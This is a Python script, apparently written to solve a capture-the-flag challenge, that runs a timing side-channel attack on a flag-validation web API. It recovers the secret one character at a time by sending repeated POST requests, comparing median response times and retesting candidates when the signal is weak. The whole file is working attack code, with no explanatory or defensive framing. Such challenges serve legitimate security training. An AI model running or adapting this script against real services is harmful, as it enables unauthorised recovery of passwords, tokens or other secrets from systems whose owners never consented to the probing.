import requests
import string
import time
import statistics

URL = "https://sofia-challenge.vercel.app/api/validate"

CHARSET = string.ascii_uppercase + string.digits + "_{}"
INITIAL_ATTEMPTS = 8      # Initial screening
RETEST_ATTEMPTS = 15      # When signal is weak
CONFIDENCE_THRESHOLD = 0.045  # 45ms minimum difference to trust result

recovered = ""

print("[*] Starting timing attack with smart backtracking...\n")

def test_character(guess, attempts):
    """Test a guess multiple times and return median time"""
    times = []
    for _ in range(attempts):
        start = time.perf_counter()
        try:
            r = requests.post(URL, json={"flag": guess}, timeout=10)
        except requests.exceptions.RequestException:
            continue
        times.append(time.perf_counter() - start)
    
    return statistics.median(times) if times else 0

def check_if_complete(flag):
    """Check if we've found the complete flag"""
    try:
        r = requests.post(URL, json={"flag": flag}, timeout=10)
        data = r.json()
        return data.get("status") == "success"
    except Exception:
        return False

while True:
    print(f"{'='*60}")
    print(f"Current progress: {recovered if recovered else '(empty)'}")
    print(f"{'='*60}\n")
    
    timings = {}
    
    # Phase 1: Initial screening of all characters
    print("[Phase 1] Screening all characters...")
    for ch in CHARSET:
        guess = recovered + ch
        median_time = test_character(guess, INITIAL_ATTEMPTS)
        timings[ch] = median_time
        print(f"  {guess:<30} -> {median_time:.4f}s")
    
    if not timings:
        print("\n[!] No successful requests — stopping.")
        break
    
    # Sort by timing (slowest first)
    sorted_chars = sorted(timings.items(), key=lambda x: x[1], reverse=True)
    
    print("\n[Top 5 Candidates]")
    for i, (ch, t) in enumerate(sorted_chars[:5], 1):
        print(f"  {i}. '{ch}' -> {t:.4f}s")
    
    best_char, best_time = sorted_chars[0]
    second_time = sorted_chars[1][1]
    time_diff = best_time - second_time
    
    print(f"\nTime difference: {time_diff*1000:.1f}ms")
    
    # Phase 2: If signal is weak, retest top candidates
    if time_diff < CONFIDENCE_THRESHOLD:
        print(f"\n[⚠️] Weak signal detected! Retesting top 3 with more samples...")
        
        retest_timings = {}
        for ch, _ in sorted_chars[:3]:
            guess = recovered + ch
            median_time = test_character(guess, RETEST_ATTEMPTS)
            retest_timings[ch] = median_time
            print(f"  {guess:<30} -> {median_time:.4f}s ({RETEST_ATTEMPTS} samples)")
        
        # Re-sort based on retest
        sorted_retest = sorted(retest_timings.items(), key=lambda x: x[1], reverse=True)
        best_char = sorted_retest[0][0]
        best_time = sorted_retest[0][1]
        second_time = sorted_retest[1][1]
        time_diff = best_time - second_time
        
        print(f"\n[Retest Results]")
        print(f"  Winner: '{best_char}' ({best_time:.4f}s)")
        print(f"  Difference: {time_diff*1000:.1f}ms")
        
        if time_diff < 0.030:  # Still weak after retest
            print(f"\n[⚠️] Still ambiguous! Trying anyway...")
    else:
        print(f"\n[✓] Strong signal - confident in result")
    
    # Add the best character
    recovered += best_char
    print(f"\n[+] Added '{best_char}' -> Current: {recovered}")
    
    # Check if complete
    if check_if_complete(recovered):
        print(f"\n{'='*60}")
        print(f"🎉 FLAG FOUND: {recovered}")
        print(f"{'='*60}")
        break
    
    # Safety limit
    if len(recovered) > 30:
        print("\n[!] Flag length exceeded 30 characters, stopping.")
        print(f"Recovered: {recovered}")
        break
    
    print()  # Blank line before next iteration

print(f"\nFinal result: {recovered}")